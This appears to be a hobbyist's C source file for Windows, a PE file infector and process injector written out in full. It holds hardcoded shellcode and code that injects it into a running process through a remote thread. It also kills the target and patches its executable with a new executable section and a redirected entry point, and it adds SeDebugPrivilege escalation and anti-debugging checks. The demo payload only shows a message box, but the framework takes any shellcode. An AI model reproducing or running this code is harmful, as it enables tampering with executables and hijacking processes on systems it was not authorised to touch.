*******************************************************
* written by : Dali Mrabet                            *
* facebook :   https://www.facebook.com/dali.mrabet.3 *
* Blog :       http://l0phttn.blogspot.com/           *
* Gr33tz to:   Mohamed Bettayeb                       *
*              Anis Ben Saleh                         *
*                                                     *  
*******************************************************

Something that I wrote in my free time....
Using any part of this code for malicious purposes is expressly forbidden.



#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <process.h>
#include <WinBase.h>
#include <imagehlp.h>


// simple shellcode that displays msgBox  "Pwned by l0pht_TN" preceded by pushad and followed popad and jmp opcodes

static  char  l0phtTN_shellcode[] =
    "\x60\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b"
    "\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b"
    "\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24"
    "\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a"
    "\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0"
    "\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c"
    "\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a"
    "\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2"
    "\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f"
    "\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52"
    "\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33"
    "\x32\x2e\x64\x68\x75\x73\x65\x72\x88\x5c\x24\x0a\x89\xe6\x56"
    "\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c\x24\x52"
    "\xe8\x61\xff\xff\xff\x68\x64\x21\x21\x58\x68\x70\x77\x6e\x65"
    "\x31\xdb\x88\x5c\x24\x07\x89\xe3\x68\x4e\x58\x20\x20\x68\x70"
    "\x68\x74\x54\x68\x6f\x20\x4c\x30\x68\x74\x7a\x20\x74\x68\x47"
    "\x72\x65\x65\x31\xc9\x88\x4c\x24\x11\x89\xe1\x31\xd2\x52\x53"
    "\x51\x52\xff\xd0\x31\xc0\x50\x61\xe9";    // put \xff\x55\x08 before /0x61 / 0xe9 if you desire to exitprocess() and not return to the OEP

/*
the following func adds a section named "L0phtTN" to the desired target .
if the executable(target) is packed , or ASLR and DEP are active on it
then the process injection would fail !!
*/
BOOL AddL0phtTnSection(char * path )
{
    // load the target
    HANDLE target =  CreateFile(path, GENERIC_READ | GENERIC_WRITE | GENERIC_EXECUTE, FILE_SHARE_READ | FILE_SHARE_WRITE  ,NULL,OPEN_EXISTING,NULL,NULL);
    if(target ==  INVALID_HANDLE_VALUE )
    {
        perror("Error in CreateFile()");
        ExitProcess(-1);

    }
    DWORD  target_size = 0 ;
// get the executable's size
    target_size =  GetFileSize(target,0);
    if(target_size == 0)
    {
        perror("Error in GetFileSize()");
        ExitProcess(-1);
    }

    IMAGE_DOS_HEADER IDH ;
    unsigned int n = 0 ;
    //read the DOS_header
    if(!ReadFile(target,&IDH,sizeof(IMAGE_DOS_HEADER),&n,NULL))
    {
        perror("Error in ReadFile() (IMAGE_DOS_HEADER) ");
        ExitProcess(-1);
    }
    // checks whether is is a valid executable
    if(IDH.e_magic != IMAGE_DOS_SIGNATURE)
    {
        perror("invalid DOS signture");
        ExitProcess(-1);
    }

    IMAGE_NT_HEADERS INH = {0};
    //sets the file pointer to the begginning of the NT header using e_lfanew value (which in turn points to it)
    SetFilePointer(target,IDH.e_lfanew,NULL,FILE_BEGIN);
    //now reaad the NT_header
    if(!ReadFile(target,&INH,sizeof(IMAGE_NT_HEADERS),&n,NULL))
    {
        perror("Error in ReadFile() (IMAGE_NT_HEADERS)");
        ExitProcess(-1);
    }
    //checks its signature  (0x4550 if is valid )
    if(INH.Signature != IMAGE_NT_SIGNATURE)
    {
        perror("invalid NT signature ");
        ExitProcess(-1);
    }
    //read the number of sections
    DWORD  Number_Sections = INH.FileHeader.NumberOfSections ;
    //now points to the last section
    SetFilePointer(target,IDH.e_lfanew + sizeof(IMAGE_NT_HEADERS) + (sizeof(IMAGE_SECTION_HEADER) * (Number_Sections -1 ) ) ,NULL,FILE_BEGIN);
    IMAGE_SECTION_HEADER last_section = {0};
    //get the last section
    ReadFile(target,&last_section,sizeof(IMAGE_SECTION_HEADER),&n,NULL) ;
    //allocate enough space to store the whole executable
    BYTE * myfile = (BYTE *)malloc(sizeof(BYTE) * target_size);
    Sleep(500) ;
    //points to the beggining of the target
    SetFilePointer(target,0,NULL,FILE_BEGIN);
    //store the whole target in myfile variable
    ReadFile(target,myfile,target_size,&n,NULL);
    Sleep(500);
    // ISH is pointer to the end of the last section
    PIMAGE_SECTION_HEADER ISH =  ( PIMAGE_SECTION_HEADER )(myfile + IDH.e_lfanew+sizeof(IMAGE_NT_HEADERS)+(sizeof(IMAGE_SECTION_HEADER) * Number_Sections) );
    // PINH points to the NT_Header
    PIMAGE_NT_HEADERS PINH = ( PIMAGE_NT_HEADERS )(myfile + IDH.e_lfanew );
    // put the new section's name ...replace it with your desired section's name
    strncpy(ISH->Name,"L0phtTN",8);
    // sets the Characteristics of the new section to (read , write , execute ) and initialized just in case for relocation stufff
    ISH->Characteristics = ( IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE );
    // align the value of SizeOfRawData based FileAlignment value of the target
    ISH->SizeOfRawData = (0X1000 % INH.OptionalHeader.FileAlignment == 0 )? 0X1000 :((0X1000/INH.OptionalHeader.FileAlignment+1) * INH.OptionalHeader.FileAlignment )  ;
    // align the beggining of the new section when it on the HD
    ISH->PointerToRawData = (last_section.SizeOfRawData % INH.OptionalHeader.FileAlignment == 0 )?(last_section.SizeOfRawData+last_section.PointerToRawData):(last_section.PointerToRawData + (last_section.SizeOfRawData/INH.OptionalHeader.FileAlignment+1)*INH.OptionalHeader.FileAlignment);
    // align the size , when is loaded into the memory
    ISH->Misc.VirtualSize = (0x1000 % INH.OptionalHeader.SectionAlignment == 0) ? 0x1000 :((0x1000/INH.OptionalHeader.SectionAlignment + 1) * INH.OptionalHeader.SectionAlignment) ;
    // align the VirtualAddress when loaded into the memory
    ISH->VirtualAddress =(last_section.Misc.VirtualSize % INH.OptionalHeader.SectionAlignment == 0)?(last_section.Misc.VirtualSize + last_section.VirtualAddress):(last_section.VirtualAddress+ (last_section.Misc.VirtualSize/INH.OptionalHeader.SectionAlignment +1)*INH.OptionalHeader.SectionAlignment);
    // increments the NumberOfSections' value
    PINH->FileHeader.NumberOfSections++;
    // SizeOfImage's value must be increased by section's VirtualSize value
    PINH->OptionalHeader.SizeOfImage = ISH->VirtualAddress + ISH->Misc.VirtualSize ;

    SetFilePointer(target,ISH->SizeOfRawData +ISH->PointerToRawData,NULL,FILE_BEGIN);
    SetEndOfFile(target) ;
    SetFilePointer(target,0,NULL,FILE_BEGIN);
    if( !WriteFile(target,myfile,target_size,&n,NULL) || n != target_size )
    {
        perror("could not write into the executable ");
        return FALSE;
    }
    CloseHandle(target);
    // the function which is responsible for shellcode injection
    puts("New section Added ");
    InjectShellcode(path,ISH->VirtualAddress,ISH->PointerToRawData,l0phtTN_shellcode,sizeof(l0phtTN_shellcode)+30);
    Sleep(500) ;
    return TRUE ;
}


BOOL CheckProcess(DWORD pid )
{
    PROCESSENTRY32 current_process ;
    HANDLE proc_list ;
    //
    // DWORD priority ;

    proc_list = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0) ;
    if( proc_list == INVALID_HANDLE_VALUE )
    {

       return FALSE ;
    }

    current_process.dwSize = sizeof(PROCESSENTRY32);

    if(!Process32First(proc_list,&current_process))
    {

        perror("error in Process32First \n");
        return FALSE ;
    }

    while(1)
    {
        if((DWORD)pid == current_process.th32ProcessID )
        {

            return  TRUE ;
        }

        if(!Process32Next(proc_list,&current_process))
            break ;
    }

    CloseHandle(proc_list) ;
    return FALSE ;
}
/*
according to MSDN : "The debug privilege allows someone to debug a process that they wouldn’t otherwise have access to.
For example, a process running as a user with the debug privilege enabled on its token can debug a service running as local system."
for more information :
 http://msdn.microsoft.com/en-us/library/windows/hardware/ff541528(v=vs.85).aspx
*/
BOOL GetDebugPrivileges(void)
{
    HANDLE token;
    TOKEN_PRIVILEGES priv;
    BOOL ret = FALSE;

    if (OpenProcessToken(GetCurrentProcessId(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY , &token))
    {
        priv.PrivilegeCount = 1;
        priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid) != FALSE && AdjustTokenPrivileges(token, FALSE, &priv, 0, NULL, NULL) != FALSE)
        {
            ret = TRUE;
        }
        CloseHandle(token);
    }
    return ret;
}
static DWORD Target_Base_addr  = 0;

char * GetTargetPath(DWORD pid)
{
    MODULEENTRY32 current;

    HANDLE snapshot;

    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE,pid);
    if (snapshot == INVALID_HANDLE_VALUE)
    {
        fprintf(stderr,"error in CreateToolhelp32Snapshot");
        ExitProcess(-1) ;
    }

    current.dwSize = sizeof(MODULEENTRY32);
    if(!Module32First(snapshot,&current))
    {
        fprintf(stderr,"error in Module32First");
        ExitProcess(-1) ;
    }
    while(1)
    {
        if(current.th32ProcessID == pid)
        {
            char * mpath = (char *)malloc(sizeof(char) * strlen(current.szExePath)+1);
            // printf("%s",current.szExePath);
            *(mpath + strlen(current.szExePath)) = '\0' ;
            //copy the path of executable
            memcpy(mpath,&current.szExePath,sizeof(char) * strlen(current.szExePath));
            //get the baseadress of the target
            Target_Base_addr = current.modBaseAddr ;
            return mpath;
        }

        if(!Module32Next(snapshot,&current))
            break ;

    }
    CloseHandle(snapshot) ;
    return NULL ;
}

BOOL InjectShellcode(char * path, DWORD new_entrypoint , DWORD RVA , char * sc, unsigned int shell_size)
{


    HANDLE Inject_Me = CreateFile(path, GENERIC_READ | GENERIC_WRITE | GENERIC_EXECUTE, FILE_SHARE_READ | FILE_SHARE_WRITE , NULL , OPEN_EXISTING ,NULL,NULL);
    if(Inject_Me == INVALID_HANDLE_VALUE )
    {
        fprintf(stderr ,"error while injecting the shellcode !");
        ExitProcess(-1) ;
    }
    IMAGE_DOS_HEADER IDH = {0} ;
    IMAGE_NT_HEADERS INH = {0} ;
    //where the return adress must be stored
    int ret = 0;
    int a ;
    char cret[30];
    memset(cret,(int)'\0',30);
    if( !ReadFile(Inject_Me,&IDH,sizeof(IMAGE_DOS_HEADER),&a,FILE_BEGIN))
    {
        perror("readfile() error 1");
        exit(-1) ;
    }
    char jmp_to_entrypoint[sizeof(l0phtTN_shellcode) + 30];
    memset(jmp_to_entrypoint,(int)'\0',sizeof(l0phtTN_shellcode) + 30);
// points to the beggining of NT_section
    SetFilePointer(Inject_Me,IDH.e_lfanew , NULL , FILE_BEGIN);
    /// puts the content of the NT-section into INH struct
    ReadFile(Inject_Me,&INH,sizeof(IMAGE_NT_HEADERS),&a,FILE_BEGIN);
    printf("\n  Original EntryPoint :%X \n ",INH.OptionalHeader.AddressOfEntryPoint);
    ret = INH.OptionalHeader.AddressOfEntryPoint  + INH.OptionalHeader.ImageBase ;
    // Because the jmp instruction encodes the next 5 opcodes like (the following : OEP - current adress ) - 5
    //
    ret =  (INH.OptionalHeader.AddressOfEntryPoint - (new_entrypoint + strlen(l0phtTN_shellcode) - 1 ) - 5 ) ;  // just to calculate the return address
    // fill cret array with return adress in little endian format  !!
    sprintf(cret," Return Adress : %0.2x%0.2x%0.2x%0.2x",( (ret << 16 )&0x00ff0000) >> 16 ,((ret << 8 )&0x00ff0000 ) >> 16 ,(ret >> 16 )&0x000000ff ,(ret >> 24 )& 0x000000ff );
    // puts(cret);
    //
    memcpy(jmp_to_entrypoint,l0phtTN_shellcode,strlen(l0phtTN_shellcode));
    // change the entry point of the target to virtual address of the L0phtTn section
    INH.OptionalHeader.AddressOfEntryPoint = new_entrypoint ;
    // replace the modified nt_section
    SetFilePointer(Inject_Me,IDH.e_lfanew,NULL,FILE_BEGIN);
    // replace the modified nt_section
    WriteFile(Inject_Me,&INH,sizeof(IMAGE_NT_HEADERS),&a,FILE_BEGIN);
    unsigned int isread = 0 ;

    SetFilePointer(Inject_Me,RVA,NULL,FILE_BEGIN);

    if(!WriteFile(Inject_Me,&jmp_to_entrypoint,shell_size,&isread,NULL) || isread != shell_size )
    {
        perror("cannot inject (WriteFile)");
        ExitProcess(-1) ;
    }
    // sets the file pointer to end of the shellcode
    SetFilePointer(Inject_Me,RVA+strlen(l0phtTN_shellcode)  ,NULL,FILE_BEGIN) ;
    //and append it with the new return address
    WriteFile(Inject_Me,&ret,sizeof(long long),&isread,NULL);
    return TRUE ;
}
int Is_It_Debugged = 0 ;
int main(int argc, char **argv)
{

    HANDLE my_exe ;
    IMAGE_DOS_HEADER IDH;
    DWORD pid = 0;
    HANDLE target;

    DWORD nbytes;
    IMAGE_NT_HEADERS INH;
    // get the TIB (thread information block )
    asm("mov eax, dword ptr fs:[0x18]");
    // get the PEB (process information block)
    asm("mov eax, dword ptr ds:[eax+0x30]");
    // get the beingDebugger flag
    asm("movzx eax, byte ptr ds:[eax+0x2]");

    asm("mov _Is_It_Debugged, eax");

    if (Is_It_Debugged == 1)
    {
        ExitProcess(-1) ;
    }
     pid = atoi(argv[1]) ;
    if( argc != 2 || pid  ==  0)
    {
        fprintf(stdout," \nUsage : %s <pid> \n",argv[0]);
        exit(-1);
    }

    printf("%d\n",pid);
   // Sleep(500);
    // check if the target is running
    if(CheckProcess(pid) == FALSE)
    {
        fprintf(stderr," \n %d not found on the list \n",pid);
        ExitProcess(-1) ;
    }
    printf("passed");
    // get path of the target (executable )
    char * pathh =  GetTargetPath(pid);
    //just in case when the anti-debug is bypassed ,the debugger is still get fooled by the anti-tracing (int 2d )
/*
    if(Is_It_Debugged == 1)
    {
        asm("pushad");
        asm("int 0x2d");
    }
*/
    // debug privileges are badly needed to get the processes running list without some issues
    GetDebugPrivileges();
    //checks if it is running under XP

    if(((int)(GetVersion() & 0x000000ff)) == 5 )
    {

        if(Target_Base_addr == 0 )
        {
            fprintf(stderr," could not get the base adress of the process \n");
            ExitProcess(-1) ;
        }
        printf("\n 0x%X \n",Target_Base_addr);
        //open the target's process
        if((my_exe = OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid)) == INVALID_HANDLE_VALUE )
        {
            fprintf(stderr," process not found ");
            ExitProcess(-1);
        }
        //read the DOS_header
        if(!ReadProcessMemory(my_exe,Target_Base_addr,&IDH,sizeof(IMAGE_DOS_HEADER),&nbytes)  || nbytes !=  sizeof(IMAGE_DOS_HEADER) || IDH.e_magic != 0x5a4d )
        {
            fprintf(stderr,"\n error in ReadProcessMemory() \n");
            ExitProcess(-1) ;
        }
        //read the NT_heaader
        if(!ReadProcessMemory(my_exe,(Target_Base_addr+(DWORD)IDH.e_lfanew),&INH,sizeof(IMAGE_NT_HEADERS),&nbytes) || nbytes != sizeof(IMAGE_NT_HEADERS) || INH.Signature != IMAGE_NT_SIGNATURE)
        {
            fprintf(stderr,"\n error in reading the IMAGE_NT_HEADERS \n");
            ExitProcess(-1) ;
        }
        LPVOID shell_addr = NULL ;
        //check if there is enough room for the shellcode
        shell_addr =  VirtualAllocEx(my_exe,0,sizeof(l0phtTN_shellcode),MEM_COMMIT,PAGE_EXECUTE_READWRITE) ;
        if(shell_addr == NULL )
        {
            fprintf(stderr,"something aint right with virtualallocEx");
            ExitProcess(-1);
        }
        //store the L0phtTn shellcode
        if(!WriteProcessMemory(my_exe,shell_addr,l0phtTN_shellcode,sizeof(l0phtTN_shellcode),&nbytes) && nbytes != sizeof(l0phtTN_shellcode) )
        {
            fprintf(stderr ,"cannot write into memory !");
            ExitProcess(-1);
        }

        HANDLE r_handle ;
        // trigger the shellcode
        r_handle =  CreateRemoteThread(my_exe,NULL,0,(LPTHREAD_START_ROUTINE)shell_addr,0,0,0) ;
        if(r_handle == INVALID_HANDLE_VALUE )
        {
            puts("cannot execute shellcode !!");
            ExitProcess(-1);
        }
        exit(0) ;
    }
    else
    {

        char * tokill = (char * )malloc(sizeof(char) * 24);
        //the target must be closed in order to add the new section !!
        sprintf(tokill,"taskkill /F /IM %d",pid);
        *(tokill + 23) = '\0' ;
        system(tokill);
        AddL0phtTnSection(pathh);
        Sleep(500) ;

    }
    system("pause");
    return 0 ;
}
